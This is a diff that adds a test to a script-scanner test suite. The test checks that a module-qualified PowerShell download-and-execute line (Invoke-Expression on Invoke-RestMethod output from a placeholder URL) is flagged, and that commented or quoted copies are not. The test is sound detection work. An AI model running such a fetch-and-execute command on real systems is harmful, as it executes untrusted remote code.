@@ -100,3 +100,10 @@ def test_sibling_archives_share_budget_and_deeper_zip_is_disclosed(tmp_path, mon
     assert deep["skipped"] == 1
     assert "Archivio annidato non aperto" in deep["errors"][0]
     assert not deep["findings"]
+
+
+def test_module_qualified_download_and_evaluation():
+    flow = r"Microsoft.PowerShell.Utility\Invoke-Expression (Microsoft.PowerShell.Utility\Invoke-RestMethod 'https://example.invalid')"
+    assert inspect_script(flow.encode(), ".ps1")
+    assert not inspect_script(("# " + flow).encode(), ".ps1")
+    assert not inspect_script(("Write-Output '" + flow.replace("'", '"') + "'").encode(), ".ps1")
